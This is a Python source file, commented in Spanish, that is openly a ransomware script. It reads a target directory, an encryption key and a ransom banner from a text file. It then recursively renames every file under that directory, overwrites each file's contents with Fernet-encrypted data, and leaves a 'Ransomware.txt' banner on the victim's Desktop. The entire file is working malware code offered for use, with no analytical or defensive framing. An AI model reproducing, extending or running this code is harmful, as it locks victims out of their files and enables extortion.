import os
from cryptography.fernet import Fernet

def install_lib():
    #Instala la libreria para cifrar los archivos.
    command = "pip install cryptography"
    os.system(command)

def get_parameters():
    #Recogemos los parametros necesarios para realizar el ataque: Path, Key y Banner Informativo.
    with open ("data_ransomware.txt", "r", ) as read_file:
        path = read_file.readline().strip()
        key = read_file.readline().strip()
        banner = read_file.readline().strip()
    return path, key, banner

def get_path_files(path):
    #Recupera el path de todos los archivos en los directorios y subdirectorios del path indicado.
    files_path = []
    for path, directory, files in os.walk(path):
        for file in files:
            files_path.append(os.path.join(path, file).replace("\\", "/"))
    return files_path


def change_files_name(files_path):
    #Modifica todos los archivos a una extension txt.
    for path in files_path:
        if not path.endswith("ransomware.py"):
            os.rename(path, path + ".txt")  

def encrypt_files(files_path, key):
    #Ciframos el contenido de los archivos .txt
    for file in files_path:
        if not file.endswith("ransomware.py"):
            with open(file, "rb") as read_file:
                content = read_file.read()
            content_encrypt = Fernet(key).encrypt(content)
            with open(file, "wb") as write_file:
                write_file.write(content_encrypt)

def create_banner(banner):
    #Crea un archivo txt llamado ransomware en el esritorio  que contiene el texto indicado en el banner.
    path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop').replace("\\", "/") + "/Ransomware.txt"
    with open(path, "w") as write_file:
        write_file.write(banner)

if __name__=="__main__":
    #Instala las librerias necesarias para cifrar los archivos.
    install_lib()
    #Recuperamos los parametros de data_ransomware.txt. 
    path, key, banner = get_parameters()
    #Averiguamos los path de cada archivo desde el directorio indicado.
    files_path = get_path_files(path)
    #Cambiamos las extensiones de los archivos para modificarlos de una forma mas sencilla.
    change_files_name(files_path)
    #Volvemos a recuperar el path y nombres de archivo ya que los hemos modificado.
    files_path = get_path_files(path)
    #Ciframos los archivos con la clave aportada.
    encrypt_files(files_path, key)
    #Creamos un banner del ataque en el escritorio.
    create_banner(banner)